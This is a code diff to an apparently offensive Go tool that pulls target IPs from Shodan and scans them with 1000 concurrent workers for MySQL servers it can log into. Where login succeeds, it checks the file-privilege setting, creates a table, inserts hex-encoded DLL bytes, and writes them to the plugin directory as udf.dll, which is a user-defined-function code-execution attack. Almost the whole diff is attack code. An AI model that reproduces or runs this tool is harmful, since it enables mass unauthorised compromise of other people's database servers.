@@ -8,7 +8,8 @@ import (
 	"os"
 	"sync"
 
-	_ "github.com/go-sql-driver/mysql"
+	 _ "github.com/go-sql-driver/mysql"
+	"github.com/ns3777k/go-shodan/shodan"
 )
 
 func getConnectionDSN(hostIP string) string {
@@ -47,7 +48,34 @@ func connect(ip string) *sql.DB {
 	return db
 }
 
-func ScanHosts(fileName string, wg *sync.WaitGroup) {
+func ScanHostsByShodanData(dataList []*shodan.HostData, wg *sync.WaitGroup) {
+
+	queue := make(chan string)
+
+	doScan := func(ip string) {
+		ScanHost(ip)
+	}
+
+	for worker := 0; worker < 1000; worker++ {
+		wg.Add(1)
+
+		go func() {
+			defer wg.Done()
+
+			for ip := range queue {
+				doScan(ip)
+			}
+		}()
+	}
+
+	for _, data := range dataList {
+		queue <- data.IP.String()
+	}
+
+	close(queue)
+}
+
+func ScanHostsByIPFile(fileName string, wg *sync.WaitGroup) {
 
 	file, err := os.Open(fileName)
 	if err != nil {
@@ -91,25 +119,24 @@ func ScanHost(ip string) {
 
 	if isAuthenticated {
 		fmt.Println("Successfully authenticated on:", ip)
-
 		loadFileAttack(db)
 	}
 
 	db.Close()
 }
 
-func executeCommand(command string, connection *sql.DB) {
-	connection.Exec(command)
+func executeCommand(command string, connection *sql.DB) error {
+	_, err := connection.Exec(command)
+	return err
 }
 
 func executeQuery(query string, connection *sql.DB) string {
 	execQuery, err := connection.Query(query)
+	defer execQuery.Close()
 
 	if err != nil {
 		log.Fatalf("Query Error %s", err)
 	}
-
-	defer execQuery.Close()
 
 	var resultStr string
 	var result string
@@ -127,9 +154,23 @@ func loadUDF2Win(connection *sql.DB) {
 	architecture := getArchitecture(connection)
 	if architecture == "x86_64" {
 		fmt.Println("Generating 64bit payload!")
-		executeCommand("insert into mysql.zephyr(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);", connection)
-		executeCommand("update mysql.zephyr set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);", connection)
-		executeCommand("select data from mysql.zephyr into dump file"+getPluginDir(connection)+"udf.dll", connection)
+		err := executeCommand("insert into mysql.zephyr(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);", connection)
+		if err != nil {
+			fmt.Println("Insertion of MZ header failed! ", err)
+			return
+		}
+
+		err = executeCommand("update mysql.zephyr set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);", connection)
+		if err != nil {
+			fmt.Println("Update of dll failed! ", err)
+			return
+		}
+
+		err = executeCommand("select data from mysql.zephyr into dump file"+getPluginDir(connection)+"udf.dll", connection)
+		if err != nil {
+			fmt.Println("Dll transfer to plugin library failed! ", err)
+			return
+		}
 	} else {
 		fmt.Println("Generating 32bit payload!")
 	}
@@ -140,8 +181,6 @@ func loadUDF2Linux(connection *sql.DB) {
 	architecture := getArchitecture(connection)
 	if architecture == "x86_64" {
 		fmt.Println("Generating 64bit payload!")
-		executeCommand("insert into mysql.zephyr(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);", connection)
-		executeCommand("update mysql.zephyr set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);", connection)
 	} else {
 		fmt.Println("Generating 32bit payload!")
 	}
@@ -151,7 +190,19 @@ func loadFileAttack(connection *sql.DB) {
 	vulnerable := isSecureFilePrivConfigVulnerable(connection)
 	if vulnerable {
 		fmt.Println("TARGET VULNERABLE")
-		executeCommand("create table if not exists mysql.zephyr(data longblob);", connection)
+		
+		err := executeCommand("drop table if exists mysql.zephyr;", connection)
+		if err != nil {
+			fmt.Println("Table preparation failed! ", err)
+			return
+		}
+		
+		err = executeCommand("create table if not exists mysql.zephyr(data longblob);", connection)
+		if err != nil {
+			fmt.Println("Table creation failed! ", err)
+			return
+		}
+		
 		targetOS := getOS(connection)
 		if targetOS == "Linux" {
 			loadUDF2Linux(connection)
